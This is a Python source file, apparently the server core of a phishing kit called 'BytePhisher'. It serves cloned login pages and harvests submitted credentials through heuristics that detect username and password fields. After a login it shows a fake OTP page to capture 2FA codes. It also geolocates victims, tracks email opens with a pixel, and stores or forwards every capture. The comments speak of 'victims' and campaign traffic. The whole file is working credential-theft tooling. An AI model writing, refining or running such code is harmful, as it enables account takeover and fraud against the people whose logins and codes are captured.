# BytePhisher — pure-Python threaded HTTP server with TLS option,
# full request logging, SQLite-backed capture, and Jinja2 template rendering.
#
# No PHP dependency. Runs on any Python 3.10+.

import http.server
import socketserver
import ssl
import os
import json
import re
import time
from urllib.parse import parse_qs, urlparse
from . import capture as cap
from . import templates as tpl
from . import risk as riskmod

# 1x1 transparent GIF (43 bytes) served at /px.gif for email open-tracking
GIF_1PX = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00"
           b"\x00\x02\x02D\x01\x00;")

def _extract_fields(raw: bytes, ct: str) -> dict:
    """Parse a form body into fields.

    Handles application/x-www-form-urlencoded, multipart/form-data (via the
    stdlib email parser — correct for quoted-printable and non-UTF8 charsets)
    and application/json (SPA-style templates post JSON instead of a form).
    """
    ct_l = (ct or "").lower()
    if "multipart/form-data" in ct_l:
        from email.parser import BytesParser
        from email.policy import default as default_policy
        header = f"Content-Type: {ct}\r\nMIME-Version: 1.0\r\n\r\n".encode()
        msg = BytesParser(policy=default_policy).parsebytes(header + raw)
        out = {}
        if msg.is_multipart():
            for part in msg.iter_parts():
                name = part.get_param("name", header="content-disposition")
                if not name or part.get_filename():
                    continue  # skip file uploads
                payload = part.get_payload(decode=True) or b""
                charset = part.get_content_charset() or "utf-8"
                out[name] = payload.decode(charset, "replace")
        return out
    if "application/json" in ct_l:
        try:
            data = json.loads(raw.decode("utf-8", "replace") or "{}")
            if isinstance(data, dict):
                return {k: (v if isinstance(v, str) else json.dumps(v)) for k, v in data.items()}
        except Exception:
            return {}
        return {}
    return {k: v[0] for k, v in parse_qs(raw.decode("utf-8", "replace")).items()}

def _is_creds(d: dict) -> bool:
    """True when the submission looks like a credential pair.

    Two tiers: exact well-known field names first, then a substring heuristic so
    real-world variants (login_id, user_name, acct_email + passwd/passcode/…
    and imported custom templates) are still recognised.
    """
    keys = [k.lower() for k in d]
    id_exact = {"username", "email", "login", "user", "user_name", "email_address",
                "user_id", "username_or_email", "email_or_username", "userid", "login_id"}
    pw_exact = {"password", "passw", "pwd", "password_confirm", "passwd", "pass_code",
                "password_confirmation", "pass", "passphrase"}
    if (id_exact & set(keys)) and (pw_exact & set(keys)):
        return True
    ident = any(any(t in k for t in ("user", "login", "email", "mail", "account",
                                     "identifier", "phone", "mobile")) for k in keys)
    secret = any(any(t in k for t in ("pass", "pwd", "pin", "secret")) for k in keys)
    return ident and secret

def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", otp=False,
                 on_capture=None, site_name=None, campaign=None, rotate_dirs=None):
    class PhishHandler(http.server.BaseHTTPRequestHandler):
        db = cap.CaptureDB(db_path)
        redirect = redirect_url
        otp_page = otp
        # staticmethod: a plain function stored on the class would bind `self`
        # as its first argument and the callback would receive the handler
        # instead of the capture dict.
        notifier = staticmethod(on_capture) if on_capture else None
        template_name = site_name
        campaign_name = campaign or site_name or ""
        rotation = list(rotate_dirs or [])   # A/B: one of these per request

        def log_message(self, fmt, *args):
            pass  # silence default stderr logging; structured logs go to DB

        def _client_ip(self):
            """Real client IP: tunnel/edge headers win over the socket address,
            otherwise every hit behind cloudflared/ngrok looks like 127.0.0.1."""
            for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
                v = self.headers.get(h)
                if v:
                    return v.strip()
            xff = self.headers.get("X-Forwarded-For")
            if xff:
                return xff.split(",")[0].strip()
            return self.client_address[0]

        GEO_URLS = {
            # free, no-key endpoints; correct paths matter (a bare host 404s)
            "ipapi":  "https://ipapi.co/{ip}/json/",
            "ipinfo": "https://ipinfo.io/{ip}/json",
        }

        def _geo(self, ip):
            if geo_provider == "off" or not ip:
                return {"ip": ip, "city": "", "country": "", "isp": ""}
            tmpl = self.GEO_URLS.get(geo_provider)
            if not tmpl:
                return {"ip": ip, "city": "", "country": "", "isp": ""}
            try:
                import urllib.request
                req = urllib.request.Request(
                    tmpl.format(ip=ip),
                    headers={"User-Agent": "bytephisher/1.0", "Accept": "application/json"})
                with urllib.request.urlopen(req, timeout=5) as r:
                    g = json.loads(r.read().decode("utf-8", "replace"))
                return {
                    "ip": ip,
                    "city": g.get("city") or "",
                    "country": (g.get("country_name") or g.get("country") or ""),
                    "isp": (g.get("org") or g.get("asn") or g.get("isp") or ""),
                }
            except Exception:
                return {"ip": ip, "city": "", "country": "", "isp": ""}

        def _device(self, ua: str):
            ua_l = ua.lower()
            if "iphone" in ua_l or "ipad" in ua_l:
                return "ios"
            if "android" in ua_l:
                return "android"
            if "mac" in ua_l:
                return "macos"
            if "win" in ua_l:
                return "windows"
            if "linux" in ua_l:
                return "linux"
            return "unknown"

        def do_GET(self):
            if self.path == "/health":
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")
                return
            # 1x1 email open-tracking pixel: returns a real GIF and counts a visit
            if self.path.startswith("/px.gif"):
                try:
                    self.db.log_visit(self._client_ip(), self.headers.get("User-Agent", ""))
                except Exception:
                    pass
                self.send_response(200)
                self.send_header("Content-Type", "image/gif")
                self.send_header("Content-Length", str(len(GIF_1PX)))
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(GIF_1PX)
                return
            # page view -> visitor counter (creds come in via POST)
            try:
                self.db.log_visit(self._client_ip(), self.headers.get("User-Agent", ""))
            except Exception:
                pass
            # render template — OTP page only when explicitly requested (/otp),
            # otherwise the victim always sees the login page first.
            # With --rotate, one of the rotation templates is chosen per request.
            import random
            site = (random.choice(self.rotation) if self.rotation
                    else self.server.current_site)
            self.served_site = site
            if site and os.path.isdir(site):
                want_otp = self.otp_page and "otp" in self.path.lower()
                html = tpl.render_site(site, self.path, want_otp)
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html.encode("utf-8"))
            else:
                self.send_error(404)

        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length)
            ct = (self.headers.get("Content-Type") or "").lower()
            fields = _extract_fields(raw, ct)
            ip = self._client_ip()
            geo = self._geo(ip)
            ua = self.headers.get("User-Agent", "")
            dev = self._device(ua)
            creds = _is_creds(fields)
            has_otp = any(k.lower().startswith("otp") for k in fields)
            # label bots/scanners instead of losing them: keeps reporting honest
            risk, risk_reasons = riskmod.score(fields, ua=ua, isp=geo["isp"], device=dev,
                                               country=geo["country"], city=geo["city"])
            self.db.record(
                source_url=self.headers.get("Referer", self.path),
                ip=geo["ip"], city=geo["city"], country=geo["country"],
                isp=geo["isp"], ua=ua, device=dev,
                fields=fields, is_cred=creds, campaign=self.campaign_name,
                risk=risk, risk_reasons=risk_reasons,
            )
            if self.notifier:
                try:
                    self.notifier({
                        "ts": time.time(), "template": self.template_name,
                        "campaign": self.campaign_name,
                        "ip": geo["ip"], "city": geo["city"], "country": geo["country"],
                        "isp": geo["isp"], "device": dev, "ua": ua,
                        "fields": fields, "is_cred": creds,
                        "risk": risk, "risk_reasons": risk_reasons,
                        "source_url": self.headers.get("Referer", self.path),
                    })
                except Exception:
                    pass  # an alert failure must never break the capture path
            # 2FA flow: after the first credential submit, show the OTP page.
            if self.otp_page and creds and not has_otp:
                served = getattr(self, "served_site", None) or self.server.current_site
                html = tpl.render_site(served, "/", True)
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html.encode("utf-8"))
            elif self.redirect:
                self.send_response(302)
                self.send_header("Location", self.redirect)
                self.end_headers()
            else:
                html = tpl.render_thankyou()
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html.encode("utf-8"))

    return PhishHandler

def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi",
            redirect_url="", otp=False, tls=False, cert_path=None,
            on_capture=None, site_name=None, campaign=None, rotate_dirs=None):
    """Start the server; returns (httpd, handler_class)."""
    Handler = make_handler(templates_dir, db_path, geo_provider, redirect_url, otp,
                           on_capture=on_capture, site_name=site_name, campaign=campaign,
                           rotate_dirs=rotate_dirs)
    class _ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads = True
        # HTTPServer's default backlog is 5; a burst of simultaneous victims
        # (or scanners) would get RST. 128 handles real campaign traffic.
        request_queue_size = 128
        allow_reuse_address = True
    httpd = _ThreadingHTTPServer(("0.0.0.0", port), Handler)
    if tls and cert_path:
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        # key path: "cert_cert.pem" -> "cert_key.pem"; anything else gets ".key"
        if "_cert." in cert_path:
            key_path = cert_path.replace("_cert.", "_key.")
        elif "cert." in os.path.basename(cert_path) and "cert_cert" not in cert_path:
            key_path = cert_path.replace("cert.", "key.")
        else:
            key_path = cert_path + ".key"
        ctx.load_cert_chain(cert_path, key_path)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.current_site = site_folder
    return httpd, Handler
